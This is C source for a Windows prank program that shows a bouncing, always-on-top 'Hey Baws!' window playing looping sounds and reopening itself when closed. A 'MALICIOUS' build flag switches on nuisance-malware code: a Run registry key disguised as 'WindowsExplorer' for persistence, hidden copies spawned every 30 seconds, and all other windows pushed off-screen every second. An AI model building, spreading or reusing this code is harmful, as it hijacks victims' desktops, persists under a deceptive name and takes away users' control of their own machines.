#include<windows.h>
#include<stdio.h>
#include "resource.h"

//#define MALICIOUS

#define WIDTH 256
#define HEIGHT 256
#define SPEED 20
#define AMOUNT_OF_SOUNDS 6
#define AMOUNT_OF_PICS 6

#define TIMER_MOVE 0x69
#define TIMER_SPAWN 0x81
#define TIMER_HIDE 0x72

HWND inline MakeWindow(HINSTANCE hInstance);
void inline getFile();
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void doMoveWindow(HWND);
DWORD WINAPI SoundThread(LPVOID unused);
void AttachToAutorun();
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);

int screenWidth, screenHeight;
char *file;
HDC bgdc = NULL;

#ifdef _DEBUG
int main(){
	HINSTANCE hInstance = GetModuleHandle(NULL);
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE prevInstance, LPSTR commandLine, int nCmdShow) {
#endif
	srand(GetTickCount());
	getFile();
#ifdef MALICIOUS
	AttachToAutorun();
#endif // MALICIOUS
	screenWidth = GetSystemMetrics(SM_CXSCREEN);
	screenHeight = GetSystemMetrics(SM_CYSCREEN);

	HWND window = MakeWindow(hInstance);

	SetTimer(window, TIMER_MOVE, 50, NULL);
#ifdef MALICIOUS
	SetTimer(window, TIMER_SPAWN, 30000, NULL);
	SetTimer(window, TIMER_HIDE, 1000, NULL);
#endif
	HANDLE soundThread = CreateThread(NULL, 0, SoundThread, NULL, 0, NULL);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	KillTimer(window, TIMER_MOVE);
#ifdef MALICIOUS
	KillTimer(window, TIMER_SPAWN);
	KillTimer(window, TIMER_HIDE);
#endif
	TerminateThread(soundThread, 0);
	DestroyWindow(window);
	return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_WINDOWPOSCHANGING:
		return 1;
	case WM_CLOSE:
		ShellExecute(NULL, "open", file, NULL, NULL, SW_SHOW);
		return 1;
#ifndef MALICIOUS
	case WM_KEYDOWN:
		if (wParam == VK_ESCAPE){
			PostQuitMessage(0);
		}
		break;
#endif // MALICIOUS
	case WM_SYSCOMMAND:
		if (wParam == SC_MINIMIZE)return 1;
		break;
	case WM_TIMER:
		switch (wParam){
		case TIMER_MOVE:
			doMoveWindow(hwnd);
			return 0;
#ifdef MALICIOUS
		case TIMER_HIDE:
			EnumWindows(EnumWindowsProc, NULL);
			return 0;
		case TIMER_SPAWN:
			ShellExecute(NULL, "open", file, NULL, NULL, SW_HIDE);
			return 0;
#endif
		}
		break;
	case WM_CREATE: {
		HINSTANCE hInstance = GetModuleHandle(NULL);
		int res = (rand() % AMOUNT_OF_PICS);
		HANDLE hBmp = LoadImage(hInstance, MAKEINTRESOURCE(PICTURE_BASE + res), IMAGE_BITMAP, 0, 0, 0);
		bgdc = CreateCompatibleDC(NULL);
		SelectObject(bgdc, hBmp);
		}
		break;
	case WM_DESTROY:
		DeleteObject(bgdc);
		break;
	case WM_PAINT: {
		PAINTSTRUCT ps;
		BeginPaint(hwnd, &ps);
		BitBlt(ps.hdc, 0, 0, WIDTH, HEIGHT, bgdc, 0, 0, SRCCOPY);
		EndPaint(hwnd, &ps);
		}
		break;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void doMoveWindow(HWND window) {
	RECT bounds;
	GetWindowRect(window, &bounds);
	static int dx = 10;
	static int dy = 10;

	if (bounds.top <= 0 || bounds.bottom >= screenHeight) dy = -dy;
	if (bounds.left <= 0 || bounds.right >= screenWidth) dx = -dx;
	MoveWindow(window, bounds.left + dx, bounds.top + dy, WIDTH, HEIGHT, true);
}

DWORD WINAPI SoundThread(LPVOID unused) {
	srand(GetTickCount());
	while (true) {
		int sound = (rand() % AMOUNT_OF_SOUNDS);
		HINSTANCE hInstance = GetModuleHandle(NULL);
		PlaySound(MAKEINTRESOURCE(SOUND_BASE + sound), hInstance, SND_SYNC | SND_RESOURCE);
	}
	return 0;
}

#ifdef MALICIOUS
void AttachToAutorun() {
	HKEY autorun;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_WRITE, &autorun);

	RegSetValueEx(autorun, "WindowsExplorer", NULL, REG_SZ, (BYTE *)_fullpath(NULL, file, 256), 256);

	RegCloseKey(autorun);
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
	char title[80];
	GetWindowText(hwnd, title, sizeof(title));
	if (strcmp(title, "Hey Baws!") == 0) {
		char class_name[80];
		GetClassName(hwnd, class_name, 80);
		if (strcmp(class_name, "ggez") != 0)
			SetWindowPos(hwnd, HWND_TOP, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), 0, 0, SWP_NOSIZE);
	}
	else SetWindowPos(hwnd, HWND_TOP, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), 0, 0, SWP_NOSIZE);
	return TRUE;
}
#endif // MALICIOUS

void inline getFile() {
	file = GetCommandLine();
	char *str = strchr(file, '"');  //ShellExecute dobavq nekvi dosadni kavi4ki
	if (str - file + 1 == 1) {
		for (int i = 1; file[i] != '"'; i++)
			file[i - 1] = file[i];
		str = strchr(file, '"');
		file[str - file - 1] = '\0';
	}
}

HWND inline MakeWindow(HINSTANCE hInstance) {
	WNDCLASSEX def = { sizeof(WNDCLASSEX), CS_OWNDC, WndProc, 0, 0, hInstance, LoadIcon(NULL, IDI_APPLICATION),
		LoadCursor(NULL, IDC_ARROW), (HBRUSH)GetStockObject(BLACK_BRUSH), NULL, "ggez", NULL };
	RegisterClassEx(&def);

	HWND window = CreateWindowEx(WS_EX_TOPMOST, "ggez", "Hey Baws!",
		WS_OVERLAPPED | WS_CAPTION | WS_MINIMIZEBOX,
		rand() % (screenWidth - WIDTH), rand() % (screenHeight - HEIGHT), WIDTH, HEIGHT, NULL, NULL, hInstance, 0);
	ShowWindow(window, SW_SHOW);
	return window;
}